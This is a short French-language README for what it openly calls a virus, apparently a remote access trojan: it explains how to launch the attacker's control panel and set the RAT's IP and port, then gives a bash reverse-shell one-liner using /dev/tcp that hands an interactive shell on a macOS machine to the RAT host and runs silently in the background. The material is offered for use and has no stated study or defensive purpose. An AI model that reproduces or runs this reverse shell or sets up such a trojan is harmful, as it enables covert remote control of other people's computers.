pour aller sur le control panel:
    1. ouvrir terminal
    2. tapez cette commande: cd chemin_access (remplacer chemin_access par le chemin d'accès du fichier)
    3. tapez cette commande: pip3 install -r requirements.txt
    3.5: configurez vos paramètres selon besoins (vars à modifier: ratip, ratport, srvip, srvport)
    4. tapez cette commande: python3 main.py

pour se connecter sur le serveur / acceder au virus:
    1. ouvrir terminal
    2. taper: bash -c 'exec bash -i &>/dev/tcp/remplacemoi1/remplacemoi2 <&1 &' (pour macOS, je suis toujours en train de faire pour windows)
    3. remplacer "remplacemoi1" par l'ip du rat (voir main.py)
    4. remplacer "remplacemoi2" par le port du rat (voir main.py)
    5. appuier sur enter
    6. rien va se passer, c'est normale! le rat est designé pour être en arrière plan.
